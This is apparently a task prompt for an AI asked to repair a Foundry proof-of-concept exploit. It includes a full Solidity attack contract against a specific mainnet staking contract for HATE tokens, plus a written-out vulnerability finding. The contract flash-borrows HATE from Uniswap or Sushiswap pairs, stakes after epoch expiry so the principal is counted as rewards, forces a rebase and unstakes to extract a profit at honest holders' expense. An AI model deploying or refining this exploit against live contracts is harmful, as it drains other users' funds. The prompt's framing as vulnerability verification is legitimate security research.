You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Post-expiry stakes are miscounted as distributable rewards, creating undercollateralized sHATE
- claim: When an epoch has expired, `stake()` pulls `_amount` HATE into the contract before calling `rebase()`, but does not transfer the matching `_amount` sHATE to the user until after `rebase()` finishes. The rebase logic computes `epoch.distribute = HATE.balanceOf(this) - sHATE.circulatingSupply()`, so the freshly deposited HATE is counted in backing while the freshly owed sHATE is still excluded from circulating supply. This misclassifies the new stake principal as surplus rewards for the next epoch.
- impact: A user can intentionally poison `epoch.distribute` and cause the next rebase to distribute part or all of their own principal across existing holders. After that rebase, the pool becomes undercollateralized: the attacker can withdraw more HATE than their net fair share while other sHATE holders are left partially or fully unredeemable.
- exploit_paths: ["Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.", "Call `stake(attacker, A)`, causing `A` HATE to be included in `balance` before the matching `A` sHATE is transferred out of the staking contract.", "Let the next rebase execute, which distributes the artificially inflated `epoch.distribute`, then redeem the attacker position while honest holders absorb the shortfall."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IsHATELike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
}

interface IHATEStaking {
    function HATE() external view returns (address);
    function sHATE() external view returns (address);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function stake(address to, uint256 amount) external;
    function unstake(address to, uint256 amount, bool rebase_) external;
    function rebase() external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function profitToken() external view returns (address) {
        return IHATEStaking(TARGET).HATE();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        IHATEStaking staking = IHATEStaking(TARGET);
        address hate = staking.HATE();

        _checkPathPreconditions(staking);

        uint256 verifierBalance = IERC20Like(hate).balanceOf(address(this));
        if (verifierBalance != 0) {
            uint256 startingBalance = verifierBalance;
            uint256 amount = _boundAttackAmount(staking, verifierBalance);
            require(amount != 0, "direct:no_usable_hate");

            _runExploitWithAmount(staking, hate, amount);

            uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
            require(endingBalance > startingBalance, "direct:no_profit");
            _profitAmount = endingBalance - startingBalance;
            return;
        }

        require(_attemptFlashFunding(staking, hate), "funding:no_supported_hate_liquidity");
        require(_profitAmount != 0, "flashswap:no_profit");
    }

    function initiateFlashSwap(address pair, uint256 amountOut) external {
        require(msg.sender == address(this), "self only");

        address hate = IHATEStaking(TARGET).HATE();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(token0 == hate || token1 == hate, "pair:no_hate");

        uint256 amount0Out = token0 == hate ? amountOut : 0;
        uint256 amount1Out = token1 == hate ? amountOut : 0;
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, amountOut));
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address pair, uint256 borrowedAmount) = abi.decode(data, (address, uint256));
        require(msg.sender == pair, "callback:invalid_pair");

        address hate = IHATEStaking(TARGET).HATE();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(token0 == hate || token1 == hate, "callback:no_hate");

        uint256 received = token0 == hate ? amount0 : amount1;
        require(received == borrowedAmount, "callback:amount_mismatch");

        IHATEStaking staking = IHATEStaking(TARGET);
        _runExploitWithAmount(staking, hate, borrowedAmount);

        uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
        _safeTransfer(hate, pair, repayment);

        uint256 remaining = IERC20Like(hate).balanceOf(address(this));
        require(remaining != 0, "callback:no_profit");
        _profitAmount = remaining;
    }

    receive() external payable {}

    function _attemptFlashFunding(IHATEStaking staking, address hate) internal returns (bool) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory counterparties = [WETH, USDC, USDT, DAI, FRAX];
        uint256[4] memory bpsOptions = [uint256(9_000), uint256(7_500), uint256(5_000), uint256(2_500)];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < counterparties.length; ++j) {
                if (counterparties[j] == hate) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(hate, counterparties[j]);
                if (pair == address(0)) {
                    continue;
                }

                uint256 reserve = _hateReserve(pair, hate);
                if (reserve == 0) {
                    continue;
                }

                uint256 maxUseful = _boundAttackAmount(staking, reserve);
                if (maxUseful == 0) {
                    continue;
                }

                for (uint256 k = 0; k < bpsOptions.length; ++k) {
                    uint256 candidate = (maxUseful * bpsOptions[k]) / 10_000;
                    if (candidate == 0) {
                        continue;
                    }

                    uint256 minRepayment = candidate + _flashFee(candidate);
                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
                    if (minBonusFloor <= (minRepayment - candidate)) {
                        continue;
                    }

                    try this.initiateFlashSwap(pair, candidate) {
                        return _profitAmount != 0;
                    } catch {
                        if (_profitAmount != 0) {
                            return true;
                        }
                    }
                }
            }
        }

        return false;
    }

    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
        require(amount != 0, "exploit:zero_amount");

        // Path stage 1: the fork must already be on or after an expired epoch so that
        // `stake()` executes its internal `rebase()` without any off-chain time control.
        (uint256 length,, uint256 end,) = staking.epoch();
        require(end <= block.timestamp, "path:not_expired");

        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
        // That is only possible on a fixed fork if the system is already at least one full
        // additional epoch behind after the first `stake()`-triggered rebase.
        require(length != 0, "path:zero_epoch_length");
        require(block.timestamp >= end + length, "path:no_second_expired_epoch");

        _approveMax(hate, TARGET, amount);
        staking.stake(address(this), amount);

        staking.rebase();

        address sHate = staking.sHATE();
        uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
        require(sBalance != 0, "exploit:no_sHATE");

        _approveMax(sHate, TARGET, sBalance);
        staking.unstake(address(this), sBalance, false);
    }

    function _boundAttackAmount(IHATEStaking staking, uint256 fundingCeiling) internal view returns (uint256) {
        address hate = staking.HATE();
        address sHate = staking.sHATE();

        uint256 stakingBalance = IERC20Like(hate).balanceOf(TARGET);
        uint256 circulating = IsHATELike(sHate).circulatingSupply();

        uint256 cap = fundingCeiling;
        if (stakingBalance < cap) {
            cap = stakingBalance;
        }
        if (circulating != 0 && circulating < cap) {
            cap = circulating;
        }

        return cap;
    }

    function _hateReserve(address pair, address hate) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == hate) {
            return uint256(reserve0);
        }
        if (IUniswapV2PairLike(pair).token1() == hate) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _checkPathPreconditions(IHATEStaking staking) internal view {
        (uint256 length,, uint256 end,) = staking.epoch();
        require(end <= block.timestamp, "path:not_expired");
        require(length != 0, "path:zero_epoch_length");
        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
    }

    function _flashFee(uint256 amount) internal pure returns (uint256) {
        return ((amount * 3) / 997) + 1;
    }

    function _approveMax(address token, address spender, uint256 minimum) internal {
        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "erc20:call_failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
